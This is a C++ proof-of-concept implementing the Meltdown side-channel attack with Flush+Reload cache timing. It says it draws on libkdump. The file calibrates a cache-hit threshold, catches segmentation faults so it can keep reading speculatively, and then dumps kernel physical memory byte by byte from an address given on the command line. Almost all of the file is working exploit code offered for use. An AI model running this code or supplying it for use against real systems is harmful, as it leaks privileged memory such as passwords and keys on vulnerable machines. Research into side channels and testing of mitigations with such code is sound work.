// This source file contains work from libkdump.
// Specifically, the assembly code, and Flush+Reload attack.

#include <cstdio>
#include <cstdint>
#include <csetjmp>
#include <cstdlib>
#include <cstring>
#include <signal.h>
#include <unistd.h>
using namespace std;

#define DEFAULT_PHYSICAL_OFFSET 0xffff880000000000ull

jmp_buf env;

class meltdown {
public:
    meltdown() {
        measurements = 3;
        accept_after = 1;
        retries = 10000;
        _mem = (char*) malloc(4096 * 300);
        mem = (char *)(((size_t)_mem & ~0xfff) + 0x1000 * 2);
        memset(mem, 0xab, 4096 * 290);
        for (int i = 0; i < 256; ++i) {
            flush(mem + i*4096);
        }
        
        // Detect flush+reload threshold
        size_t reload_time = 0, flush_reload_time = 0, count = 1000000;
        size_t dummy[16];
        size_t *ptr = dummy + 8;
        uint64_t start, end;

        maccess(ptr);
        for (size_t i = 0; i < count; ++i) {
            start = rdtsc();
            maccess(ptr);
            end = rdtsc();
            reload_time += (end - start);
        }
        for (size_t i = 0; i < count; ++i) {
            start = rdtsc();
            maccess(ptr);
            end = rdtsc();
            flush(ptr);
            flush_reload_time += (end - start);
        }
        reload_time /= count;
        flush_reload_time /= count;
        cache_miss_threshold = (flush_reload_time + reload_time * 2)/3;

        // Ignore SIGSEGV.
        signal(SIGSEGV, segfault_handler);
    }

    ~meltdown() {
        free(_mem);
    }

    int read(size_t addr) {
        char res_stat[256];
        memset(res_stat, 0, sizeof(res_stat));

        for (int i = 0; i < measurements; ++i) {
            res_stat[read_byte((void*) addr)]++;
        }

        int max_v = 0, max_i = 0;
        for (int i = 1; i < 256; ++i) {
            if (res_stat[i] > max_v && res_stat[i] >= accept_after) {
                max_v = res_stat[i];
                max_i = i;
            }
        }
        return max_i;
    }

private:
    size_t cache_miss_threshold;
    int measurements;
    int accept_after;
    int retries;
    char *_mem, *mem;

    inline uint64_t rdtsc() {
        uint64_t a = 0, d = 0;
        asm volatile("mfence");
        asm volatile("rdtscp" : "=a"(a), "=d"(d) :: "rcx");
        asm volatile("mfence");
        return (d << 32) | a;
    }

    inline void maccess(void *p) {
        asm volatile("movq (%0), %%rax" :: "c"(p) : "rax");
    }

    inline void flush(void *p) {
        asm volatile("clflush 0(%0)" :: "c"(p) : "rax");
    }

    int __attribute__((always_inline)) flush_reload(void *ptr) {
        // check if ptr is in cache.
        uint64_t start = 0, end = 0;
        start = rdtsc();
        maccess(ptr);
        end = rdtsc();
        flush(ptr);
        return end - start < cache_miss_threshold;
    }

    int read_byte(void *phys) {
        volatile size_t retries = this->retries + 1;

        while (retries--) {
            // Read phys and segfault.
            // This should bring the desired page to cache.
            if (!setjmp(env)) {
                asm volatile("1:\n"
                             "movzx (%%rcx), %%rax\n"
                             "shl $12, %%rax\n"
                             "jz 1b\n"
                             "movq (%%rbx,%%rax,1),%%rbx\n"
                             :
                             : "c"(phys), "b"(mem)
                             : "rax");
            }

            // Flush+Reload to check which page is cached.
            for (int i = 0; i < 256; ++i) {
                if (flush_reload(mem + i * 4096)) {
                    if (i >= 1) {
                        return i;
                    }
                }
            }
        }
        return 0;
    }

    static void segfault_handler(int signum) {
        // Unblock SIGSEGV and jump back to read.
        sigset_t sigs;
        sigemptyset(&sigs);
        sigaddset(&sigs, signum);
        sigprocmask(SIG_UNBLOCK, &sigs, NULL);
        longjmp(env, 1);
    }
};

const char *message = "you should not read this!";

void test1(meltdown& m)
{
    const char *message = "Welcome to Meltdown!\n";
    for (size_t i = 0; i < strlen(message); ++i) {
        printf("%c", m.read((size_t)(message+i)));
        fflush(stdout);
    }
}

size_t phys_to_virt(size_t phys) {
    return phys+DEFAULT_PHYSICAL_OFFSET;
}

int main(int argc, char *argv[])
{
    meltdown m;
    test1(m);

    if (argc > 1) {
        size_t addr = static_cast<size_t>(strtoull(argv[1], NULL, 16));
        printf("Will begin dumping physical memory starting from 0x%016zX,\n", addr);
        printf("whose virtual address is 0x%016zX.\n", phys_to_virt(addr));
        printf("Press Ctrl-C to interrupt.\n");

        while (true) {
            printf("%c", m.read(phys_to_virt(addr++)));
            fflush(stdout);
        }
    } else {
        printf("Give me an address and I will start dumping.\n");
    }
    
    return 0;
}
